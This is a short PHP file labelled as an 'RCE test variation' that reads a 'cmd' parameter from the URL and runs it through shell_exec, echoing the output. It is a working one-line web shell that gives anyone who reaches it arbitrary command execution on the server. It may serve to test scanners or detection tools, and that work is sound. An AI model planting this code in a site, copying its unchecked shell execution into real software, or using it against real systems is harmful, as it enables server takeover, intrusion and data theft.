<?php
// RCE test variation #168
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>